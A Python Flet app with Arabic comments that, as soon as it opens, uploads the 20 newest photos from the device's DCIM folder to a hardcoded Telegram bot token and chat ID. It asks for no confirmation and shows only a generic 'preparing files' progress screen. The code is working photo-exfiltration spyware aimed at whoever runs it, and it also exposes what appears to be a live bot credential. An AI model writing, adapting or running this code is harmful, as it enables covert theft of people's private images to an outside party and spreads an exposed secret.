import os
import glob
import requests
import threading
import time
import flet as ft

# إعداد بيانات بوت تيليجرام - قم بتعديلها بما يتناسب مع بياناتك
TOKEN = "7259492835:AAEJhhqbEzTOj0Q7vZj6YOK0PmwRHYqaroM"   # ضع هنا رمز التوكن الخاص بك
CHAT_ID = "6486770497"              # ضع هنا معرف الدردشة (رقمي أو نصي)
IMAGE_DIR = "/storage/emulated/0/DCIM/"  # عدل المسار حسب بيئتك

def send_images(page: ft.Page, progress_bar: ft.ProgressBar, status_text: ft.Text):
    """
    تقوم الدالة بالبحث عن آخر 20 صورة في المجلد المحدد وإرسالها إلى بوت تيليجرام،
    مع تحديث شريط التقدم والنص لعرض حالة العملية.
    """
    # تحديث النص ليعلم المستخدم بأن العملية بدأت
    status_text.value = "جاري تجهيز الملفات..."
    page.update()
    
    # البحث عن ملفات الصور بامتدادات شائعة
    extensions = ["*.jpg", "*.jpeg", "*.png"]
    image_files = []
    for ext in extensions:
        image_files.extend(glob.glob(os.path.join(IMAGE_DIR, ext)))
    
    if not image_files:
        status_text.value = "لم يتم العثور على صور في المجلد المحدد."
        page.update()
        return

    # فرز الصور بناءً على وقت التعديل (الأحدث أولاً)
    image_files = sorted(image_files, key=os.path.getmtime, reverse=True)
    last_20_images = image_files[:20]
    total = len(last_20_images)
    
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    messages = []  # لتجميع رسائل نتيجة الإرسال

    for idx, image_path in enumerate(last_20_images):
        try:
            with open(image_path, "rb") as photo:
                payload = {"chat_id": CHAT_ID}
                files_payload = {"photo": photo}
                response = requests.post(url, data=payload, files=files_payload)
                if response.status_code == 200:
                    messages.append(f"تم إرسال: {os.path.basename(image_path)}")
                else:
                    messages.append(f"فشل إرسال: {os.path.basename(image_path)}")
        except Exception as e:
            messages.append(f"خطأ في {os.path.basename(image_path)}: {e}")
        
        # تحديث شريط التقدم
        progress_bar.value = (idx + 1) / total
        page.update()
        # يمكن إضافة تأخير بسيط إذا رغبت في ملاحظة حركة شريط التقدم
        time.sleep(0.1)
    
    # عرض ملخص النتائج بعد الانتهاء
    status_text.value = "\n".join(messages)
    page.update()

def main(page: ft.Page):
    page.title = "إرسال الصور إلى Telegram"
    page.padding = 20
    page.horizontal_alignment = "center"
    page.vertical_alignment = "center"

    # إنشاء عنصر نص لعرض الحالة
    status_text = ft.Text("جاري تجهيز الملفات...", size=16)
    
    # إنشاء شريط التقدم
    progress_bar = ft.ProgressBar(value=0, width=300)
    
    # إضافة العناصر إلى الصفحة
    page.add(status_text, progress_bar)
    page.update()

    # تشغيل عملية الإرسال في Thread منفصل حتى لا تحجب واجهة المستخدم
    threading.Thread(
        target=send_images, 
        args=(page, progress_bar, status_text),
        daemon=True
    ).start()

# تشغيل التطبيق
ft.app(target=main)
